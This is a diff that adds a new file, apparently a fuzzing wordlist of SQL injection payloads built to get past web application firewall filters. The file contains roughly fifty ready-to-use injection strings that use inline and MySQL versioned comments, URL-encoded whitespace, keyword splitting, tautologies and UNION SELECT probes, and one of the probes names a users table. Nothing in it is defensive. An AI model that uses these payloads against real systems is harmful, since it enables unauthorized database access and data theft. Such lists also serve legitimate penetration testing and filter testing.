@@ -1,0 +1,55 @@
+1'/**/AND/**/1=1-- -
+1'/*comment*/AND/*comment*/1=1-- -
+1'/*!AND*/1=1-- -
+1'/*!50000AND*/1=1-- -
+1'/**/OR/**/1=1-- -
+1 /*!UNION*/ /*!SELECT*/ 1,2,3-- -
+1 UNION/**/SELECT 1,2,3-- -
+1/**/UNION/**/SELECT/**/1,2,3-- -
+1'/**/UNION/**/SELECT/**/NULL-- -
+1 /*!UNION SELECT*/ 1,2,3-- -
+1%09UNION%09SELECT%091,2,3-- -
+1%0AUNION%0ASELECT%0A1,2,3-- -
+1%0DUNION%0DSELECT%0D1,2,3-- -
+1%0CSELECT%0C1,2,3-- -
+1/*!50000UNION*/SELECT 1,2,3-- -
+1+UNION+SELECT+1,2,3-- -
+1 UNION%20SELECT 1,2,3-- -
+1 UNION	SELECT	1,2,3-- -
+1%20UNION%20SELECT%201,2,3-- -
+1' AND--+
+1'-- - AND 1=1
+1'---AND 1=1
+1' UNION SELECT 1/**/FROM/**/users-- -
+1'/*test*/UNION/*test*/SELECT/*test*/1-- -
+1'/**_**/UNION/**_**/SELECT/**_**/1-- -
+1' UNION /*!40000 SELECT*/ 1-- -
+1%27%20UNION%20SELECT%201--%20-
+1' UNION(SELECT(1),(2),(3))-- -
+1' /*!UNION*/ SELECT 1,2,3-- -
+1 union(select 1,2,3)-- -
+# Additional comment bypass patterns
+1'/*!32302OR*/1=1-- -
+1'/*[blank]*/UNION/*[blank]*/SELECT/*[blank]*/1-- -
+1/**/OR/**/1=1/**/-- -
+1'/***/OR/***/1/***/=/***/1-- -
+1'+/*comment*/'+'/*comment*/'='
+1'%0d%0aOR%0d%0a1=1-- -
+1'%0bOR%0b1=1-- -
+# Nested comment bypass
+1'/*!OR*/1=1-- -
+1'/* ignored */OR/* ignored */1=1-- -
+# Inline comment midword
+1' UN/**/ION SE/**/LECT 1,2,3-- -
+1'SE/**/LECT/* */1-- -
+1' AND(/**/1=1)-- -
+# Version-specific comments
+1'/*!40001OR*/1=1-- -
+1'/*!50001OR*/1=1-- -
+1'/*!80001OR*/1=1-- -
+# Multi-line injection
+1' OR
+1=1-- -
+1'/*
+*/OR/*
+*/1=1-- -
